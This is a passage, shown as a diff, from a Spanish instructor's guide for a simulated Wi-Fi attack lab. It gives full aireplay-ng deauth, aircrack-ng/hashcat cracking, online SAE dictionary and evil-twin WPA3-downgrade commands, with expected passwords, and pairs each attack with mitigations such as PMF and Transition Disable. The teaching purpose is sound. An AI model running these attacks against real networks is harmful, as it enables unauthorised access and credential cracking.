+<p>Igual que <code>he_wpa2</code>, pero dirigido <strong>al cliente antiguo</strong>:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 2
+BSSID=&lt;BSSID_TM&gt;
+CLIENT_WPA2=&lt;MAC de wlan_cli2_tm&gt;     <span class="hljs-comment"># lo das tú; en airodump es el que reasocia con el deauth</span>
+
+<span class="hljs-built_in">sudo</span> airodump-ng -c 2 --bssid <span class="hljs-variable">$BSSID</span> -w cap_tm wlan0mon
+<span class="hljs-comment"># Otra terminal: deauth al cliente SIN PMF</span>
+<span class="hljs-built_in">sudo</span> aireplay-ng -0 3 -a <span class="hljs-variable">$BSSID</span> -c <span class="hljs-variable">$CLIENT_WPA2</span> wlan0mon
+<span class="hljs-comment"># Al reconectar, airodump marca &quot;WPA handshake&quot;</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <span class="hljs-variable">$BSSID</span> cap_tm-01.cap
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>princess</code>. Y esa clave sirve también para entrar por
+WPA3, porque es la misma.</p>
+<h3 id="b-el-contraste-el-mismo-deauth-contra-el-cliente-wpa3-no-hace-nada">b) El contraste: el mismo deauth contra el cliente WPA3 <strong>no hace nada</strong></h3>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> aireplay-ng -0 10 -a <span class="hljs-variable">$BSSID</span> -c &lt;MAC de wlan_cli3_tm&gt; wlan0mon
+</div></code></pre>
+<p>El cliente SAE tiene PMF: ignora el deauth falsificado (responde con una <em>SA
+Query</em> protegida y sigue conectado). En airodump, su línea no se corta y no
+aparece ningún handshake nuevo suyo. Es la demostración en directo de para qué
+sirve 802.11w.</p>
+<p><strong>Cómo distinguir los dos clientes en airodump.</strong> Los dos están en la lista
+STATION del mismo BSSID. El que se cae y reasocia con el deauth es el WPA2; el
+que lo aguanta es el WPA3. Para confirmarlo desde el host:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_cli2_tm wpa_cli -p /var/run/wpa_supplicant_tm2 -i wlan_cli2_tm status | grep -E <span class="hljs-string">&#x27;key_mgmt|pmf&#x27;</span>
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_cli3_tm wpa_cli -p /var/run/wpa_supplicant_tm3 -i wlan_cli3_tm status | grep -E <span class="hljs-string">&#x27;key_mgmt|pmf&#x27;</span>
+<span class="hljs-comment"># tm2: key_mgmt=WPA2-PSK, pmf=0   |   tm3: key_mgmt=SAE, pmf=2</span>
+</div></code></pre>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li><strong>El modo de transición expone un RSN IE con los dos AKM</strong> (PSK y SAE). Un
+atacante solo tiene que ir a por el AKM más débil: el handshake WPA2 es
+crackeable offline exactamente igual que en <code>he_wpa2</code>.</li>
+<li><strong>PMF no puede ser obligatoria</strong> sin dejar fuera a los clientes WPA2, así que
+esos clientes siguen siendo vulnerables al deauth. Solo los clientes SAE,
+protegidos por PMF, lo resisten.</li>
+<li><strong>Mitigación:</strong> cuando ya no haga falta compatibilidad, WPA3 puro. Mientras
+tanto, <strong>Transition Disable</strong> (ver 8.3): el AP indica a los clientes capaces
+de SAE que dejen de usar WPA2 para ese SSID, aunque esto no protege a los
+dispositivos que solo hablan WPA2.</li>
+</ul>
+<hr>
+<h2 id="82-he-wpa3-wpa3-puro-solo-sae-diccionario-online">8.2 <code>he_wpa3</code> — WPA3 puro (solo SAE): diccionario <strong>online</strong></h2>
+<p>AP solo SAE, PMF obligatoria (<code>ieee80211w=2</code>). No hay nada crackeable offline.
+El único ataque es probar contraseñas <strong>haciendo un intercambio SAE real con el
+AP</strong>, una por conexión. Contraseña débil a propósito (<code>iloveyou</code>).</p>
+<h3 id="a-primero-comprobar-que-lo-de-siempre-no-funciona">a) Primero, comprobar que lo de siempre NO funciona</h3>
+<p>Es la parte más importante de la práctica. El alumno intenta capturar y crackear
+como en los escenarios anteriores:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 5
+BSSID=&lt;BSSID_WPA3&gt;
+<span class="hljs-built_in">sudo</span> airodump-ng -c 5 --bssid <span class="hljs-variable">$BSSID</span> -w cap_wpa3 wlan0mon
+<span class="hljs-comment"># El cliente reasocia cada 30 s (el deauth no sirve: PMF). Esperar y Ctrl+C.</span>
+
+<span class="hljs-comment"># Intento de crackeo (fracasa):</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <span class="hljs-variable">$BSSID</span> cap_wpa3-01.cap
+hcxpcapngtool -o wpa3.22000 cap_wpa3-01.cap &amp;&amp; <span class="hljs-built_in">ls</span> -l wpa3.22000
+</div></code></pre>
+<p><strong>Resultado:</strong> aircrack-ng dice <code>no valid WPA handshakes found</code> y
+<code>hcxpcapngtool</code> no escribe ninguna línea (0 hashes). SAE no deja material
+offline. Conviene enseñar la captura en Wireshark filtrando <code>wlan.fixed.auth.alg == 3</code> (SAE): se ven los <em>Commit</em> y <em>Confirm</em>, pero no hay nada que crackear.</p>
+<h3 id="b-el-ataque-que-si-aplica-diccionario-online-sae-onlinesh">b) El ataque que sí aplica: diccionario online (<code>sae_online.sh</code>)</h3>
+<p>En el laboratorio va incluido <code>sae_online.sh</code>, que automatiza el diccionario
+online con <code>wpa_supplicant</code>. Usa una interfaz del alumno (en managed, no
+monitor):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ./sae_online.sh -i wlan2 -s he_wpa3 -b &lt;BSSID_WPA3&gt; -c 5 -n 500
+</div></code></pre>
+<p>El script prueba cada contraseña con un intercambio SAE completo y se detiene al
+encontrarla, midiendo la velocidad:</p>
+<pre class="hljs"><code><div>[  12] Probando: iloveyou
+[✓] CONTRASEÑA ENCONTRADA: 'iloveyou'  (12 intentos en 7 s)
+    Velocidad: 1.71 intentos/s -&gt; rockyou completo (14,3 M): 97 días
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>iloveyou</code>. Lo revelador es la <strong>velocidad</strong>: 1-3
+intentos/s. La extrapolación que imprime el script es la lección: rockyou
+entero tardaría <strong>meses</strong>, y una contraseña robusta, inviable. Compáralo con
+los ~pocos segundos del mismo diccionario offline en <code>he_wpa2</code>.</p>
+<blockquote>
+<p><strong>Alternativa pública:</strong> existe <code>wacker</code> (script en Python sobre <code>wpa_cli</code>,
+mismo principio). <code>sae_online.sh</code> evita tener que clonarlo y da la medida de
+velocidad ya hecha. Si prefieres <code>wacker</code>, el procedimiento es equivalente.</p>
+</blockquote>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li><strong>Online, no offline.</strong> Cada candidata exige el <em>hunting-and-pecking</em> (derivar
+el punto de la curva) y un intercambio Commit/Confirm con el AP. Sin el AP no
+se avanza, y el AP responde a su ritmo (un intento tarda segundos, no
+microsegundos). No hay GPU que acelere esto.</li>
+<li><strong>El AP puede defenderse.</strong> Al ser online, el AP ve muchos <em>Commit</em> fallidos
+seguidos y puede limitar la tasa o bloquear. hostapd tiene
+<code>sae_anti_clogging_threshold</code> (ahora <code>anti_clogging_threshold</code>) que, superado
+un número de <em>commits</em> en curso, exige un token y frena la fuerza bruta. En
+este escenario no se activa para que la práctica avance; en el fundamento se
+comenta como defensa.</li>
+<li><strong>Ataques de canal lateral (Dragonblood, Vanhoef–Ronen 2019) — no
+reproducibles aquí.</strong> El <em>hunting-and-pecking</em> original tenía fugas de
+<strong>tiempo</strong> y de <strong>caché</strong> que permitían recuperar información de la contraseña
+y reducir el espacio de búsqueda. Dos motivos para no montarlo: (1) están
+corregidos desde hostapd 2.8 con <strong>Hash-to-Element (H2E)</strong>, la derivación en
+tiempo constante (<code>sae_pwe=1</code> o <code>2</code>); (2) medir tiempos en <code>mac80211_hwsim</code>
+no es fiable. Se explican, pero no se practican.</li>
+<li><strong>Mitigación:</strong> contraseña larga y aleatoria (hace inviable el online);
+<strong>H2E</strong> (<code>sae_pwe=2</code>) contra los canales laterales; limitación de tasa de
+<em>commits</em> en el AP.</li>
+</ul>
+<hr>
+<h2 id="83-he-wpa3-dg-downgrade-de-un-cliente-wpa3-dragonblood">8.3 <code>he_wpa3_dg</code> — Downgrade de un cliente WPA3 (Dragonblood)</h2>
+<p>El AP es <strong>solo WPA3</strong> (SAE + PMF), correcto. La debilidad está en el
+<strong>cliente</strong>: su perfil guardó la red aceptando también WPA2 (<code>key_mgmt=SAE WPA-PSK</code>), como un móvil que recuerda la red como &quot;WPA2/WPA3&quot;. Un <strong>AP gemelo
+solo WPA2</strong> con el mismo SSID consigue que el cliente le hable WPA2 y le entregue
+un M2 calculado con la clave real, que se crackea offline. Es el <em>downgrade
+attack</em> de Vanhoef y Ronen.</p>
+<h3 id="como-esta-montado">Cómo está montado</h3>
+<ul>
+<li>AP real <code>he_wpa3_dg</code>: <code>wpa_key_mgmt=SAE</code>, <code>ieee80211w=2</code>. Impecable.</li>
+<li>Cliente <code>wlan_cli_dg</code>: <code>key_mgmt=SAE WPA-PSK</code>, <code>ieee80211w=1</code> (PMF opcional).
+Esta línea es la vulnerabilidad: acepta volver a WPA2.</li>
+<li>El cliente se reasocia cada 30 s (<code>select_network</code> + <code>reassociate</code>), así el
+alumno no depende de un deauth (que PMF bloquearía).</li>
+</ul>
+<h3 id="a-montar-el-ap-gemelo-solo-wpa2-y-capturar">a) Montar el AP gemelo solo WPA2 y capturar</h3>
+<pre class="hljs"><code><div>BSSID_REAL=&lt;BSSID_DG&gt;
+
+<span class="hljs-comment"># Config del gemelo: MISMO SSID, solo WPA2, MISMA contraseña NO hace falta</span>
+<span class="hljs-comment"># (basta con que el cliente envíe el M2; su MIC se calcula con su clave real)</span>
+<span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /tmp/gemelo.conf &gt; /dev/null
+interface=wlan1
+driver=nl80211
+ssid=he_wpa3_dg
+hw_mode=g
+channel=10
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=loquesea12345
+EOF
+
+<span class="hljs-comment"># El gemelo registra el intento de conexión del cliente</span>
+<span class="hljs-built_in">sudo</span> hostapd -<span class="hljs-built_in">dd</span> /tmp/gemelo.conf 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> /tmp/gemelo.log &amp;
+
+<span class="hljs-comment"># Capturar en el canal 10</span>
+<span class="hljs-built_in">sudo</span> airmon-ng start wlan0 10
+<span class="hljs-built_in">sudo</span> airodump-ng -c 10 --bssid <span class="hljs-variable">$BSSID_REAL</span> -w cap_dg wlan0mon
+</div></code></pre>
+<p>Cuando el cliente reasocie (cada 30 s) y elija el gemelo, enviará M1/M2 WPA2.
+airodump marcará <code>WPA handshake</code>. Basta M1+M2.</p>
+<blockquote>
+<p>En <code>mac80211_hwsim</code> todas las radios se oyen igual, así que el cliente puede
+seguir prefiriendo el AP real. Si en 1-2 minutos no cae, fuerza la
+demostración parando un momento el AP legítimo:
+<code>sudo ip netns exec ns_ap_dg pkill hostapd</code> (y redespliega al terminar), o
+mantén el gemelo corriendo y espera varias reasociaciones.</p>
+</blockquote>
+<h3 id="b-crackear-el-m2-robado">b) Crackear el M2 robado</h3>
+<pre class="hljs"><code><div>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <span class="hljs-variable">$BSSID_REAL</span> cap_dg-01.cap
+<span class="hljs-comment"># o hashcat</span>
+hcxpcapngtool -o dg.22000 cap_dg-01.cap
+hashcat -m 22000 dg.22000 /usr/share/wordlists/rockyou.txt
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>babygirl</code>. El cliente ha calculado el MIC del M2 con la
+PMK de WPA2 = <code>PBKDF2(babygirl, SSID)</code>, que <strong>sí</strong> es crackeable offline, aunque
+el AP real solo hablara WPA3.</p>
+<h3 id="c-la-mitigacion-transition-disable">c) La mitigación: Transition Disable</h3>
+<p>Redespliega activando la bandera y repite el ataque:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ./limpia.sh
+<span class="hljs-built_in">sudo</span> DG_TRANSITION_DISABLE=1 ./despliegue.sh
+</div></code></pre>
+<p>Ahora el AP real incluye el elemento <strong>Transition Disable</strong> en el handshake. La
+primera vez que el cliente se conecta por SAE, wpa_supplicant <strong>anota que esta
+red ya no debe aceptar WPA2</strong> y a partir de ahí rechaza al gemelo. Repitiendo el
+apartado a), el cliente ya no entrega ningún M2 WPA2: no hay handshake que
+capturar. Para comprobar que la bandera está puesta:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_cli_dg wpa_cli -p /var/run/wpa_supplicant_dg -i wlan_cli_dg status | grep -i mgmt
+<span class="hljs-comment"># Tras conectarse con transition_disable, el cliente fija key_mgmt=SAE y descarta WPA-PSK</span>
+</div></code></pre>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li><strong>El downgrade lo habilita el cliente, no el AP.</strong> Un cliente que acepta
+&quot;WPA2 o WPA3&quot; para un SSID enviará un M2 WPA2 a cualquier AP con ese SSID que
+solo ofrezca WPA2. El atacante no necesita la contraseña para provocar ese M2:
+lo calcula el cliente, con su clave real, y su MIC es un verificador offline
+como en <code>he_wpa2</code>.</li>
+<li><strong>PMF no lo impide.</strong> PMF protege las tramas de gestión (deauth), pero no
+decide a qué AP se asocia el cliente ni qué AKM negocia. El downgrade ocurre en
+la asociación, no en un deauth.</li>
+<li><strong>Transition Disable (WFA, 2020)</strong> es la defensa estándar: un bit que el AP
+envía dentro del 4-way (protegido) y que indica al cliente que &quot;pegue&quot; la red
+a WPA3/SAE y no vuelva a aceptar WPA2, WPS ni PMF opcional. Es cosa del
+cliente recordarlo, por eso la vulnerabilidad vive en el cliente.</li>
+<li><strong>Mitigación:</strong> no guardar redes en modo mixto cuando el AP ya es WPA3;
+Transition Disable; y en clientes gestionados, perfiles que fijen SAE y PMF
+obligatoria.</li>
+</ul>
+<hr>
+<h2 id="84-el-escenario-2-como-practica-guiada-sin-ap-dedicado">8.4 El escenario 2 como práctica guiada (sin AP dedicado)</h2>
+<p><code>he_wpa3_dg</code> ya trae un AP y un cliente para que el downgrade funcione &quot;solo&quot;.
+Si prefieres que el alumno <strong>monte él</strong> todo el ataque (más realista, el AP
+gemelo lo levanta con su propia interfaz), puede hacerlo contra <code>he_wpa3_tm</code> o
+contra <code>he_wpa3_dg</code> con el procedimiento del apartado 8.3.a: el AP gemelo WPA2 en
+<code>wlan1</code>, el deauth (si el objetivo no tiene PMF) o la espera a la reasociación, y
+el crackeo del M2. La diferencia es solo quién levanta el gemelo: el escenario lo
+automatiza; la práctica guiada lo pone en manos del alumno.</p>
+<hr>
 <h2 id="mantenimiento-cambiar-las-claves">Mantenimiento: cambiar las claves</h2>
 <ul>
 <li>
@@ -1203,8 +1861,22 @@ así que se calcula para cada red:</p>
 </li>
 <li>
 <p><strong>WEP:</strong> <code>wep_key0</code> en hex. Solo admite 5 o 13 caracteres ASCII (10 o 26 hex):</p>
-<pre class="hljs"><code><div><span class="hljs-built_in">printf</span> <span class="hljs-string">'ilovemyfamily'</span> | od -An -tx1 | tr -d <span class="hljs-string">' \n'</span>
+<pre class="hljs"><code><div><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;ilovemyfamily&#x27;</span> | <span class="hljs-built_in">od</span> -An -tx1 | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; \n&#x27;</span>
 </div></code></pre>
+</li>
+<li>
+<p><strong>WPS:</strong> no hay nada que cambiar: el PIN y la clave se generan en cada
+despliegue. La <strong>duración</strong> del ataque se ajusta en <code>despliegue.sh</code> con los
+módulos de <code>WPS_PIN7</code> (<code>RANDOM % 100</code> en cada mitad). Si los subes, el
+ataque tarda más; con <code>% 10000</code> y <code>% 1000</code> tendrías el caso real completo.</p>
+</li>
+<li>
+<p><strong>WPA3 (<code>he_wpa3_tm</code>, <code>he_wpa3</code>, <code>he_wpa3_dg</code>):</strong> SAE no admite PMK en hex,
+así que la contraseña va en claro (<code>wpa_passphrase</code> / <code>sae_password</code>) en el
+<code>hostapd.conf</code> de cada uno dentro de <code>despliegue.sh</code>. Cámbiala ahí y en el
+<code>wpa.conf</code>/<code>wpa3.conf</code>/<code>wpa2.conf</code> del cliente correspondiente. Usa palabras de
+<code>rockyou.txt</code>. Para que <code>he_wpa3</code> siga siendo didáctico, mantén una clave que
+esté pronto en el diccionario (el ataque es online y lento).</p>
 </li>
 </ul>
 <p>Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.</p>
@@ -1212,10 +1884,22 @@ así que se calcula para cada red:</p>
 <h2 id="verificacion-y-apagado">Verificación y apagado</h2>
 <pre class="hljs"><code><div><span class="hljs-comment"># Ver APs y namespaces activos</span>
 ip netns list
-sudo ip netns <span class="hljs-built_in">exec</span> ns_ap_pmkid_nc iw dev
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_pmkid_nc iw dev
+
+<span class="hljs-comment"># Watchdog de WPS activo y estado del PIN</span>
+pgrep -af LAB_WPS_WATCHDOG
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_wps hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps wps_get_status
+
+<span class="hljs-comment"># Clientes WPA3 conectados (key_mgmt y PMF de cada uno)</span>
+<span class="hljs-keyword">for</span> ns <span class="hljs-keyword">in</span> tm3:ns_cli3_tm:wlan_cli3_tm:tm3 tm2:ns_cli2_tm:wlan_cli2_tm:tm2 \
+          w3:ns_cli_wpa3:wlan_cli_wpa3:wpa3 dg:ns_cli_dg:wlan_cli_dg:dg; <span class="hljs-keyword">do</span>
+  IFS=: <span class="hljs-built_in">read</span> -r et nsx ifx ctl &lt;&lt;&lt; <span class="hljs-string">&quot;<span class="hljs-variable">$ns</span>&quot;</span>
+  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$et</span>: &quot;</span>
+  <span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;<span class="hljs-variable">$nsx</span>&quot;</span> wpa_cli -p <span class="hljs-string">&quot;/var/run/wpa_supplicant_<span class="hljs-variable">$ctl</span>&quot;</span> -i <span class="hljs-string">&quot;<span class="hljs-variable">$ifx</span>&quot;</span> status 2&gt;/dev/null | grep -E <span class="hljs-string">&#x27;wpa_state|key_mgmt|pmf&#x27;</span> | <span class="hljs-built_in">paste</span> -sd<span class="hljs-string">&#x27; &#x27;</span>
+<span class="hljs-keyword">done</span>
 
 <span class="hljs-comment"># Apagar todo el laboratorio</span>
-sudo ./limpia.sh
+<span class="hljs-built_in">sudo</span> ./limpia.sh
 </div></code></pre>
 <hr>
 <h2 id="herramientas-usadas">Herramientas usadas</h2>
@@ -1225,6 +1909,9 @@ sudo ./limpia.sh
 filtrado de PMKID/handshake)</li>
 <li><strong>hashcat</strong> (modo <code>22000</code> = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL</li>
 <li><strong>tshark</strong> (análisis de capturas)</li>
+<li><strong>reaver / wash</strong> y <strong>bully</strong> (detección de WPS y fuerza bruta del PIN)</li>
+<li><strong>sae_online.sh</strong> (diccionario <em>online</em> contra WPA3-SAE, incluido en el lab)</li>
+<li><strong>hostapd / wpa_supplicant con SAE</strong> (escenarios WPA3; del sistema, sin parches)</li>
 </ul>
 
 </div>
